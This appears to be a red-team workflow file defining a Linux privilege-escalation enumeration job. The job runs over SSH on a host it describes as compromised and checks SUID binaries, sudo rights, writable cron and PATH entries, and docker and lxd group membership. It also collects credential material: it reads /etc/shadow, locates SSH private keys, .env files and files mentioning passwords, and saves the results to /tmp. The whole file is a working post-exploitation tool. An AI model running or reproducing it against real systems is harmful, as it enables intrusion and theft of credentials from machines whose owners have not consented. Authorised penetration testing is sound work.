name: privesc-linux
description: |
  Linux privilege escalation enumeration — SUID binaries, writable paths,
  kernel exploits, sudo misconfigs, cron jobs, capabilities, and more.
  Runs via SSH on a compromised host.
tags: [redteam, privesc, linux, post-exploitation]
dispatch:
  inputs:
    target:
      required: true
      type: string
      description: Target host IP
      alias: t
    user:
      required: true
      type: string
      description: SSH username
    password:
      type: string
      default: ''
      description: SSH password
    ssh_key:
      type: string
      default: ''
      description: SSH key path

jobs:
  enum:
    name: Privilege Escalation Enumeration
    outputs:
      enum_file: '{{ steps["privesc-checks"].outputs.enum_file | default("", true) }}'
      finding_count: '{{ steps["privesc-checks"].outputs.finding_count | default("", true) }}'
    steps:
    - name: privesc-checks
      script: |
        from ofx.api.post import RunnerRegistry
        from pathlib import Path

        kwargs = {'host': '{{ inputs.target }}', 'user': '{{ inputs.user }}'}
        pw = '{{ inputs.password }}'
        key = '{{ inputs.ssh_key }}'
        if pw: kwargs['password'] = pw
        if key: kwargs['key_path'] = key
        runner = RunnerRegistry.create('ssh', **kwargs)

        checks = {}

        # System info
        checks['kernel'] = runner.run('uname -a').strip()
        checks['os_release'] = runner.run('cat /etc/os-release 2>/dev/null | head -5').strip()
        checks['whoami'] = runner.run('id').strip()

        # SUID binaries
        checks['suid'] = runner.run('find / -perm -4000 -type f 2>/dev/null').strip()

        # Capabilities
        checks['capabilities'] = runner.run('getcap -r / 2>/dev/null').strip()

        # Sudo
        checks['sudo_l'] = runner.run('sudo -l 2>/dev/null').strip()
        checks['sudo_version'] = runner.run('sudo --version 2>/dev/null | head -1').strip()

        # Writable directories
        checks['writable_dirs'] = runner.run('find / -writable -type d 2>/dev/null | grep -v proc | head -30').strip()
        checks['writable_files'] = runner.run('find /etc /opt /var -writable -type f 2>/dev/null | head -20').strip()

        # Cron
        checks['crontab'] = runner.run('cat /etc/crontab 2>/dev/null').strip()
        checks['cron_dirs'] = runner.run('ls -la /etc/cron* 2>/dev/null').strip()
        checks['user_cron'] = runner.run('crontab -l 2>/dev/null').strip()
        checks['cron_writable'] = runner.run('find /etc/cron* -writable -type f 2>/dev/null').strip()

        # Interesting files
        checks['shadow_readable'] = runner.run('cat /etc/shadow 2>/dev/null | head -3').strip()
        checks['ssh_keys'] = runner.run('find /home /root -name "id_rsa" -o -name "id_ed25519" 2>/dev/null').strip()
        checks['env_files'] = runner.run('find / -name ".env" -o -name "*.env" 2>/dev/null | head -10').strip()
        checks['password_files'] = runner.run('grep -rl "password" /etc/ /opt/ /var/www/ 2>/dev/null | head -15').strip()

        # Services
        checks['listening'] = runner.run('ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null').strip()
        checks['docker'] = runner.run('docker ps 2>/dev/null; id | grep -q docker && echo "USER IN DOCKER GROUP"').strip()
        checks['lxd'] = runner.run('id | grep -q lxd && echo "USER IN LXD GROUP"').strip()

        # Kernel exploits hints
        checks['kernel_version'] = runner.run('uname -r').strip()
        checks['gcc'] = runner.run('which gcc cc 2>/dev/null').strip()

        # NFS
        checks['nfs'] = runner.run('cat /etc/exports 2>/dev/null').strip()

        # PATH hijack
        checks['path'] = runner.run('echo $PATH').strip()
        checks['path_writable'] = runner.run('for p in $(echo $PATH | tr ":" " "); do [ -w "$p" ] && echo "WRITABLE: $p"; done').strip()

        # Report
        findings = []
        if 'NOPASSWD' in checks.get('sudo_l', ''):
            findings.append('[CRITICAL] Sudo NOPASSWD entries found')
        if checks.get('shadow_readable', ''):
            findings.append('[CRITICAL] /etc/shadow is readable')
        if checks.get('suid', ''):
            suid_count = len(checks['suid'].splitlines())
            findings.append(f'[HIGH] {suid_count} SUID binaries found')
        if checks.get('capabilities', ''):
            findings.append(f'[HIGH] Capabilities set on binaries')
        if 'DOCKER GROUP' in checks.get('docker', ''):
            findings.append('[CRITICAL] User in docker group — root escape possible')
        if 'LXD GROUP' in checks.get('lxd', ''):
            findings.append('[CRITICAL] User in lxd group — root escape possible')
        if checks.get('cron_writable', ''):
            findings.append('[HIGH] Writable cron files found')
        if checks.get('path_writable', ''):
            findings.append('[HIGH] Writable PATH directories')
        if checks.get('nfs', '') and 'no_root_squash' in checks.get('nfs', ''):
            findings.append('[HIGH] NFS no_root_squash enabled')
        if checks.get('ssh_keys', ''):
            findings.append('[MEDIUM] SSH private keys found')

        out_file = '/tmp/ofx_privesc_linux.txt'
        with open(out_file, 'w') as f:
            for name, output in checks.items():
                f.write(f"=== {name.upper()} ===\n{output}\n\n")

        add_outputs(enum_file=out_file, finding_count=len(findings))
        print("=" * 50)
        print(f" PRIVESC ENUM: {{ inputs.target }}")
        print("=" * 50)
        print(f"\nKernel: {checks['kernel']}")
        print(f"User: {checks['whoami']}\n")
        if findings:
            print("--- FINDINGS ---")
            for f in findings:
                print(f"  {f}")
        else:
            print("No obvious privesc vectors found")
        print(f"\nFull report: {out_file}")
      log-stdout: true
